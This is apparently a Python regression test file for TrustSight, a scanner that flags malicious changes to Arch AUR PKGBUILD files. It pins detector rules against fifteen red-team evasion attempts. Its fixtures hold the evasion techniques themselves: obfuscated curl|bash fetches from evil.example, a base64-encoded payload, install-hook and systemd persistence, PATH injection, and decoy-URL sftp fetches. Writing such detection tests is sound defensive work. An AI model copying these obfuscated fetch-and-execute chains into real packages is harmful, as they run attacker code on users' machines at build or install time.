"""Regression tests for the nine red-team PKGBUILD evasion attempts.

Each attempt was originally crafted to slip below TrustSight's detection
threshold.  After the fixes these tests pin, every attempt either scores at
least 20 or records the expected coverage gap.
"""

import difflib

import pytest

from trustsight.analysis.pipeline import scan_diff

# ---------------------------------------------------------------------------
# A line break for Python that is not one for a shell.
# ---------------------------------------------------------------------------

#: ``str.splitlines`` breaks on eight characters bash does not treat as a
#: line terminator. Each one split a payload across two "lines" that bash
#: runs as one command, so any rule whose pattern spanned the break stopped
#: matching - which is every line-based rule in the project.
PYTHON_ONLY_LINE_BREAKS = [
    ("VT",  "\v"),
    ("FF",  "\f"),
    ("FS",  "\x1c"),
    ("GS",  "\x1d"),
    ("RS",  "\x1e"),
    ("NEL", "\x85"),
    ("LS",  " "),
    ("PS",  " "),
]


@pytest.mark.parametrize("name,separator", PYTHON_ONLY_LINE_BREAKS)
def test_a_python_only_line_break_does_not_hide_a_payload(name, separator):
    r"""``curl -fsSL url<VT>| bash`` is one command, and R001 must see it.

    bash ends a word at ``|`` whatever precedes it, so the fetch is piped
    into a shell and runs. Python saw two lines, so R001's
    ``curl.*\|\s*(bash|sh|...)`` had ``curl`` on one and ``| bash`` on the
    other and matched neither: the payload executed and nothing fired.

    The characters are kept rather than stripped, because bash keeps them -
    removing one would join two words that stay separate at build time.
    What changed is only where a *line* is considered to end.
    """
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n build() {\n"
        f"+  curl -fsSL https://evil.example/x{separator} | bash\n }}\n"
    )
    fired = {e.rule_id for e in scan_diff(diff, package_name="p").score_breakdown}
    assert "R001" in fired, f"{name} hid the pipe-to-shell"


def test_the_splitter_matches_splitlines_on_ordinary_text():
    """Only the extra separators change.

    Line counts are indices shared across modules - `map_diff_lines` keys
    what `apply_rules` reports - so a splitter that disagreed with
    `splitlines` by one on a trailing newline would misattribute every
    finding after it.
    """
    from trustsight.tokenizer import split_lines

    for text in ["", "a", "a\n", "a\nb", "a\nb\n", "a\r\nb\r\n", "\n\n"]:
        assert split_lines(text) == text.splitlines(), repr(text)


_BASE_PKGBUILD = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.15.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')
source=("git+${url}.git#commit=1111111111111111111111111111111111111111")
sha256sums=('SKIP')

package() {
  cd "$srcdir/$pkgname"
  install -Dm644 fonts.conf "${pkgdir}"/etc/fonts/conf.d/99-tweaks.conf
}
"""


def _diff(old: str, new: str, old_name: str = "a/PKGBUILD", new_name: str = "b/PKGBUILD") -> str:
    return "".join(
        difflib.unified_diff(
            old.splitlines(keepends=True),
            new.splitlines(keepends=True),
            fromfile=old_name,
            tofile=new_name,
        )
    )


def _fact(new_pkgbuild: str, tree_manifest=None, **extra) -> object:
    diff = _diff(_BASE_PKGBUILD, new_pkgbuild)
    return scan_diff(
        diff,
        package_name="fontconfig-tweaks",
        current_text=new_pkgbuild,
        tree_manifest=tree_manifest,
        **extra,
    )


def _rule_ids(fact) -> set[str]:
    return {e.rule_id for e in fact.score_breakdown}


# Attempt 1: array expansion hides ``curl``/``bash`` so the literal
# ``curl ... | bash`` never appears on one line.
ATTEMPT1 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.16.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')

_c=(c"u"rl -fsSL)
_x=(ba"sh")

source=("git+${url}.git#commit=2222222222222222222222222222222222222222")
sha256sums=('SKIP')

package() {
  cd "$srcdir/$pkgname"
  install -Dm644 fonts.conf "${pkgdir}"/etc/fonts/conf.d/99-tweaks.conf
  "${_c[0]}" "${url}/raw/main/sync.sh" -o "$srcdir/sync.sh"
  "${_x[0]}" "$srcdir/sync.sh"
}
"""


def test_attempt1_array_expansion_fetch_then_execute():
    fact = _fact(ATTEMPT1)
    assert fact.final_score >= 20
    assert "H082" in _rule_ids(fact)


# Attempt 2: download the payload through the declared ``source=()`` array
# (checksum-backed) and execute it with bash.
ATTEMPT2 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.17.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')
source=("git+${url}.git#commit=3333333333333333333333333333333333333333"
        "${url}/raw/main/sync.sh")
sha256sums=('SKIP'
            '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08')

package() {
  cd "$srcdir/$pkgname"
  install -Dm644 fonts.conf "${pkgdir}"/etc/fonts/conf.d/99-tweaks.conf
  bash "${srcdir}/sync.sh"
}
"""


def test_attempt2_downloaded_source_file_executed():
    fact = _fact(ATTEMPT2)
    assert fact.final_score >= 20
    assert "H083" in _rule_ids(fact)


# Attempt 3: command substitution inside ``source=()`` so the fetched URL is
# computed at build time.
ATTEMPT3 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.18.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')

_asset() { printf '%s' "${url}/releases/download/v${pkgver}/lcd-assets.tar.gz"; }

source=("git+${url}.git#commit=4444444444444444444444444444444444444444"
        "$(_asset)")
sha256sums=('SKIP'
            '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08')

package() {
  cd "$srcdir/$pkgname"
  install -Dm644 fonts.conf "${pkgdir}"/etc/fonts/conf.d/99-tweaks.conf
  tar -xf "$srcdir/lcd-assets.tar.gz" -C "${pkgdir}"
}
"""


def test_attempt3_command_substitution_in_source():
    fact = _fact(ATTEMPT3)
    assert fact.final_score >= 20
    assert "C007" in _rule_ids(fact)
    assert "unresolved_source" in fact.coverage_gaps


# Attempt 4: hide the downloader inside a function called via parse-time
# command substitution.
ATTEMPT4 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.19.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')

_latest_commit() { c"u"rl -fsSL "${url}/raw/main/COMMIT"; }
_pin=$(_latest_commit)

source=("git+${url}.git#commit=4444444444444444444444444444444444444444")
sha256sums=('SKIP')

package() {
  cd "$srcdir/$pkgname"
  install -Dm644 fonts.conf "${pkgdir}"/etc/fonts/conf.d/99-tweaks.conf
}
"""


def test_attempt4_parse_time_function_fetch():
    fact = _fact(ATTEMPT4)
    assert fact.final_score >= 20
    assert "H077" in _rule_ids(fact)
    assert "unresolved_parse_time" in fact.coverage_gaps


# Attempt 5: execute a helper script committed to the AUR repo but not
# declared in ``source=()``.  Covered by H081.
ATTEMPT5 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.20.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')
source=("git+${url}.git#commit=5555555555555555555555555555555555555555")
sha256sums=('SKIP')

package() {
  cd "$srcdir/$pkgname"
  install -Dm644 fonts.conf "${pkgdir}"/etc/fonts/conf.d/99-tweaks.conf
  bash "${startdir}/helper.sh"
}
"""


def test_attempt5_committed_undeclared_file_executed():
    fact = _fact(ATTEMPT5)
    assert fact.final_score >= 20
    assert "H081" in _rule_ids(fact)


# Attempt 6: move the whole payload into an install hook.
ATTEMPT6_INSTALL = """post_install() {
  _c=(c"u"rl -fsSL)
  _x=(ba"sh")
  "${_c[0]}" "https://github.com/example/fontconfig-tweaks/raw/main/sync.sh" -o /usr/share/fontconfig-tweaks/sync.sh
  "${_x[0]}" /usr/share/fontconfig-tweaks/sync.sh
}

post_upgrade() {
  post_install
}
"""


def test_attempt6_install_hook_fetch_then_execute():
    new = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.21.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')
install=fontconfig-tweaks.install
source=("git+${url}.git#commit=6666666666666666666666666666666666666666")
sha256sums=('SKIP')

package() {
  cd "$srcdir/$pkgname"
  install -Dm644 fonts.conf "${pkgdir}"/etc/fonts/conf.d/99-tweaks.conf
}
"""
    pkgbuild_diff = _diff(_BASE_PKGBUILD, new)
    install_diff = _diff("", ATTEMPT6_INSTALL, old_name="a/fontconfig-tweaks.install", new_name="b/fontconfig-tweaks.install")
    fact = scan_diff(
        pkgbuild_diff + install_diff,
        package_name="fontconfig-tweaks",
        current_text=new,
    )
    assert fact.final_score >= 20
    assert {"H017", "R007"} & _rule_ids(fact)


# Attempt 7: base64-decode an embedded payload and run it.
ATTEMPT7 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.22.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')
source=("git+${url}.git#commit=7777777777777777777777777777777777777777")
sha256sums=('SKIP')

package() {
  cd "$srcdir/$pkgname"
  install -Dm644 fonts.conf "${pkgdir}"/etc/fonts/conf.d/99-tweaks.conf
  _b=(ba"se64" -d)
  _x=(ba"sh")
  cat > "$srcdir/sync.b64" <<'PAYLOAD'
Y3VybCAtZnNTTCBodHRwczovL2V2aWwuZXhhbXBsZS5uZXQveC5zaCB8IGJhc2gK
PAYLOAD
  "${_b[0]}" "${_b[1]}" "$srcdir/sync.b64" > "$srcdir/sync.sh"
  "${_x[0]}" "$srcdir/sync.sh"
}
"""


def test_attempt7_base64_payload_then_execute():
    fact = _fact(ATTEMPT7)
    assert fact.final_score >= 20
    assert {"R043", "H068"} & _rule_ids(fact)


# Attempt 8: hide the payload in a source-tarball binary and run it from a
# systemd service.
_ATTEMPT8_SERVICE = b"""[Unit]
Description=Font cache synchronization
After=network.target

[Service]
ExecStart=/usr/lib/fontconfig-tweaks/sync
Restart=always

[Install]
WantedBy=multi-user.target
"""

ATTEMPT8 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.23.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig' 'systemd')
source=("git+${url}.git#commit=8888888888888888888888888888888888888888")
sha256sums=('SKIP')

package() {
  cd "$srcdir/$pkgname"
  install -Dm644 fonts.conf "${pkgdir}/etc/fonts/conf.d/99-tweaks.conf"
  install -Dm644 fontcache-sync.service "${pkgdir}/usr/lib/systemd/system/fontcache-sync.service"
  install -Dm755 sync "${pkgdir}/usr/lib/fontconfig-tweaks/sync"
}
"""


def test_attempt8_service_binary_undeclared():
    fact = _fact(
        ATTEMPT8,
        tree_manifest=[
            ("PKGBUILD", ATTEMPT8.encode()[:4096]),
            ("fontcache-sync.service", _ATTEMPT8_SERVICE),
        ],
    )
    assert fact.final_score >= 20
    assert "H084" in _rule_ids(fact)


# Attempt 9: PATH injection via a build-tree directory so a standard ``make``
# picks up a smuggled compiler/tool.
ATTEMPT9 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.24.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')
makedepends=('make')
source=("git+${url}.git#commit=9999999999999999999999999999999999999999")
sha256sums=('SKIP')

build() {
  cd "$srcdir/$pkgname"
  env "PA"TH="$srcdir/tools:$PATH" make
}

package() {
  cd "$srcdir/$pkgname"
  make DESTDIR="${pkgdir}" install
}
"""


def test_attempt9_path_injection_undeclared_directory():
    fact = _fact(ATTEMPT9)
    assert fact.final_score >= 20
    assert "H085" in _rule_ids(fact)


def test_cmake_cache_path_type_is_not_a_path_assignment():
    """``-D<VAR>:PATH=`` and ``:FILEPATH=`` are cmake type annotations.

    Reading them as PATH assignments fired H025 and H085 on a routine
    ``cmake`` invocation and, because H085 grabs the rest of the line, on a
    ``$srcdir/`` argument from a later ``-D``.
    """
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,8 +1,12 @@\n"
        " pkgname=projecteur\n pkgver=0.10\n pkgrel=1\n"
        "+prepare() {\n"
        "+  cmake -DCMAKE_INSTALL_PREFIX:PATH=/usr -DCMAKE_INSTALL_LIBDIR=lib "
        '-DDATA_DIR="$srcdir/$pkgname-0.10" "$srcdir/$pkgname-$pkgver"\n'
        "+}\n"
    )
    ids = _rule_ids(scan_diff(diff, package_name="projecteur"))
    assert "H025" not in ids
    assert "H085" not in ids


def test_a_real_path_assignment_in_a_build_function_is_still_caught():
    diff = (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,8 +1,10 @@\n"
        " pkgname=x\n pkgver=1\n pkgrel=1\n"
        "+prepare() {\n"
        '+  PATH="$srcdir/tools:$PATH" make\n'
        "+}\n"
    )
    assert "H085" in _rule_ids(scan_diff(diff, package_name="x"))


#: Modules that read attacker-authored diff or PKGBUILD text. Every one must
#: split it the way a shell does.
_MATCHING_MODULES = (
    "rules.py", "tokenizer.py", "differ.py", "coverage.py", "deps.py",
)

#: Splitting output this project produced itself is not the same problem.
_NOT_ATTACKER_TEXT = {"discovery.py", "seed_build.py", "srcinfo.py",
                      "ioc_baseline.py", "corpus.py", "pivot.py", "export.py",
                      # pacman's own stdout, not a package's text.
                      "db.py"}


def test_no_matching_module_splits_lines_the_python_way():
    r"""`str.splitlines` breaks on eight characters a shell does not.

    The first sweep replaced `name.splitlines()` and silently missed
    `clamp_text(diff_text).splitlines()` - a call on a call, which the
    pattern could not see. Four modules kept the old behaviour:
    `sabotage`, `crossfire`, `adoption` and `buildfetch`, which between
    them hold the sabotage family, the whole crossfire family and the
    orphan-adoption rules. A payload split by `` or `U+2028` stayed
    invisible to all of them for exactly as long as nobody looked.

    A grep is the fix, because the defect was that a grep was not general
    enough.
    """
    import pathlib

    root = pathlib.Path(__file__).resolve().parent.parent / "src" / "trustsight"
    offenders = []
    for path in sorted(root.rglob("*.py")):
        if path.name in _NOT_ATTACKER_TEXT or "__pycache__" in str(path):
            continue
        for number, line in enumerate(path.read_text().splitlines(), start=1):
            if ".splitlines()" in line and "def split_lines" not in line:
                offenders.append(f"{path.relative_to(root)}:{number}")
    assert offenders == [], (
        "these read attacker text and must use tokenizer.split_lines: "
        f"{offenders}"
    )


# ---------------------------------------------------------------------------
# Attempt 10: benign-name declared source executed (bypass c8c3e1b7)
# ---------------------------------------------------------------------------

#: ``source+=(http://evil.example/configure)`` with a matching checksum,
#: then ``./configure`` in build().  H083's ``_H072_BENIGN_EXEC`` exemption
#: treated the execution of a file fetched from an attacker host like an
#: ordinary build step, so only SOURCE_BUCKET (20) fired - exactly the
#: threshold, unflagged.
ATTEMPT10 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.19.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')
source=("git+${url}.git#commit=5555555555555555555555555555555555555555"
        "http://evil.example/configure")
sha256sums=('SKIP'
            '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08')

build() {
  cd "$srcdir/$pkgname"
  true && ./configure
}

package() {
  cd "$srcdir/$pkgname"
  install -Dm644 fonts.conf "${pkgdir}"/etc/fonts/conf.d/99-tweaks.conf
}
"""


def test_attempt10_foreign_declared_source_benign_name_executed():
    fact = _fact(ATTEMPT10)
    assert "H083" in _rule_ids(fact)


def test_attempt10b_sibling_upstream_source_stays_silent():
    """A configure that genuinely comes from the upstream is not foreign.

    The same execution shape with the build script hosted under the
    package's own upstream domain must keep H083's ordinary benign-exec
    exemption - the fix targets provenance, not the filename.
    """
    new = ATTEMPT10.replace(
        '"http://evil.example/configure"',
        '"https://github.com/example/fontconfig-tweaks/raw/main/configure"',
    )
    fact = _fact(new)
    assert "H083" not in _rule_ids(fact)


# ---------------------------------------------------------------------------
# Attempt 11: fetch/exec chain split across the diff boundary (bypass
# dbf38ba3)
# ---------------------------------------------------------------------------

_FETCH_BASE = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.20.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')

build() {
  cd "$srcdir/$pkgname"
  curl -s http://evil.example/s.sh -o s.sh
}
"""

#: The fetch sits unchanged on a context line; only ``bash s.sh`` is added
#: (above the fetch, the order the bypass used).  Every pairing rule read
#: added lines only, so the chain scored 5 (R010+W001).
ATTEMPT11 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.20.1
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')

build() {
  cd "$srcdir/$pkgname"
  bash s.sh
  curl -s http://evil.example/s.sh -o s.sh
}
"""

#: Mirror image: the execution is the pre-existing line and the fetch is
#: what the diff adds.
ATTEMPT11_MIRROR = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.20.1
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')

build() {
  cd "$srcdir/$pkgname"
  bash s.sh
  curl -s http://evil.example/s.sh -o s.sh
}
"""


def test_attempt11_fetch_on_context_line_exec_added():
    diff = _diff(_FETCH_BASE, ATTEMPT11)
    fact = scan_diff(diff, package_name="fontconfig-tweaks",
                     current_text=ATTEMPT11)
    assert "H082" in _rule_ids(fact)


def test_attempt11_mirror_exec_on_context_line_fetch_added():
    base = _FETCH_BASE.replace(
        "curl -s http://evil.example/s.sh -o s.sh\n", "bash s.sh\n")
    diff = _diff(base, ATTEMPT11_MIRROR)
    fact = scan_diff(diff, package_name="fontconfig-tweaks",
                     current_text=ATTEMPT11_MIRROR)
    assert "H082" in _rule_ids(fact)


def test_attempt11_both_halves_preexisting_stays_silent():
    """A version bump over an old fetch+exec pair is not a new chain."""
    bumped = _FETCH_BASE.replace("pkgver=2.20.0", "pkgver=2.20.1")
    diff = _diff(_FETCH_BASE, bumped)
    fact = scan_diff(diff, package_name="fontconfig-tweaks",
                     current_text=bumped)
    assert "H082" not in _rule_ids(fact)


# ---------------------------------------------------------------------------
# Attempt 12: Backblaze CLI v1 spelling `b2 download` (client-list gap)
# ---------------------------------------------------------------------------

ATTEMPT12 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.21.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')

build() {
  cd "$srcdir/$pkgname"
  b2 download bkt/s.py s.py
  python3 s.py
}
"""


def test_attempt12_b2_v1_download_spelling_pairs_with_execution():
    fact = _fact(ATTEMPT12)
    assert "H082" in _rule_ids(fact)


# ---------------------------------------------------------------------------
# Attempt 13: object-store client with a global option before the verb
# (harness wave-3/5/evasion-matrix D family)
# ---------------------------------------------------------------------------

#: ``NETWORK_CLIENT_ALTERNATIVES`` required the download subcommand to be
#: adjacent to the client.  A single global option between them left the
#: fetch invisible: no client was recognised, so ``bash s.sh`` paired with
#: nothing and the chain scored 0.  The store clients take global options
#: before their verb, exactly like ``git -C`` already did.
_D13 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.22.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')
source=("git+${url}.git#commit=1111111111111111111111111111111111111111")
sha256sums=('SKIP')

build() {
  cd "$srcdir/$pkgname"
  @@FETCH@@
  bash s.sh
}
"""


@pytest.mark.parametrize("fetch", [
    "rclone --limit-rate=1M copy r:s.sh s.sh",
    "rclone -c x copyto r:s.sh s.sh",
    "s3cmd -c sc get s3://b/s.sh s.sh",
    "s3cmd --region=us get s3://b/s.sh s.sh",
    "aws s3 --endpoint-url=http://x cp s3://b/s.sh s.sh",
    "aws s3api --endpoint-url=http://x get-object --bucket b --key s.sh s.sh",
    "gsutil -m cp gs://b/s.sh s.sh",
    "gsutil -u p cp gs://b/s.sh s.sh",
    "ipfs --api=/ip4/1.2.3.4/tcp/5001 get QmX -o s.sh",
    "rados -p pool get obj s.sh",
    "swift --os-auth-url=http://x download cont s.sh",
])
def test_attempt13_option_before_verb_still_pairs_fetch_with_execution(fetch):
    fact = _fact(_D13.replace("@@FETCH@@", fetch))
    assert "H082" in _rule_ids(fact)


# ---------------------------------------------------------------------------
# Attempt 14: foreign declared source, sibling/same-host/trusted-forge
# (harness wave-4/6 evasion matrix)
# ---------------------------------------------------------------------------

#: The Attempt-10 fix exempted a declared build script when its host shared
#: a registrable domain with a sibling source, matched the ``url=`` domain,
#: or sat on a trusted forge.  Declaring *two* attacker-hosted scripts made
#: one vouch for the other, and a ``github.com/evil`` path matched the
#: upstream's ``github.com`` domain.  Only a source inside the upstream's
#: own repository is exempt now.
_D14 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.23.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')
source=(@@SOURCES@@)
sha256sums=(@@SUMS@@)

build() {
  cd "$srcdir/$pkgname"
  ./configure
}
"""

_ZERO = "'" + "0" * 64 + "'"


@pytest.mark.parametrize("sources", [
    # two attacker sources on one host: the sibling vouched for the payload
    '"http://evil.example/a" "http://evil.example/configure"',
    # a benign tarball and the script on the same attacker host
    '"http://evil.example/b.tar.gz" "http://evil.example/configure"',
    # trusted forge, different repository owner than the upstream
    '"https://github.com/evil/configure"',
    # trusted forge, different forge than the upstream
    '"https://gitlab.com/evil/configure"',
    # same registered domain, attacker subdomain
    '"http://cdn.evil.example/configure"',
])
def test_attempt14_foreign_declared_build_script_is_executed(sources):
    n = sources.count('"') // 2
    new = _D14.replace("@@SOURCES@@", sources).replace("@@SUMS@@", " ".join([_ZERO] * n))
    fact = _fact(new)
    assert "H083" in _rule_ids(fact)


def test_attempt14b_upstream_owned_build_script_stays_silent():
    """A configure inside the upstream's own repository is still ordinary."""
    new = _D14.replace(
        "@@SOURCES@@",
        '"https://github.com/example/fontconfig-tweaks/raw/main/configure"',
    ).replace("@@SUMS@@", _ZERO)
    fact = _fact(new)
    assert "H083" not in _rule_ids(fact)


# ---------------------------------------------------------------------------
# Attempt 15: host-form fetch with a declared-URL decoy operand (reopened
# bypass list2-b/987b9ebd, recorded against 0.17.2 and still scoring 0 at
# 0.18.1)
# ---------------------------------------------------------------------------

_D15 = """# Maintainer: Jane Doe <jane@example.org>
pkgname=fontconfig-tweaks
pkgver=2.21.0
pkgrel=1
pkgdesc="Sensible font rendering tweaks for LCD panels"
arch=('any')
url="https://github.com/example/fontconfig-tweaks"
license=('MIT')
depends=('fontconfig')
source=("https://github.com/example/fontconfig-tweaks/archive/v2.21.0.tar.gz")
sha256sums=('1111111111111111111111111111111111111111111111111111111111111111')

build() {
  sftp -b - root@evil.example https://github.com/example/fontconfig-tweaks/archive/v2.21.0.tar.gz <<< "get /setup.py"
  python3 setup.py build
}
"""


def test_attempt15_host_form_fetch_with_declared_url_decoy_is_flagged():
    """``sftp u@evil.example <declared URL>`` then ``python3 setup.py``.

    The host-form operand is the real remote; the scheme URL is a decoy
    argument naming a declared source.  ``fetch_addresses`` used to yield
    the scheme address first, H016 compared it against ``source=()``, found
    it declared, and stopped - the foreign host operand was never examined,
    so the chain scored 0.
    """
    fact = _fact(_D15)
    assert "H016" in _rule_ids(fact)


def test_attempt15_upstream_host_form_fetch_stays_silent():
    """The same spelling against the package's own host is ordinary.

    ``sftp`` to the declared upstream with the declared tarball as an
    argument names no foreign remote; the fix targets the decoy's
    *attribution*, not the client.
    """
    new = _D15.replace("root@evil.example", "git@github.com")
    fact = _fact(new)
    assert "H016" not in _rule_ids(fact)
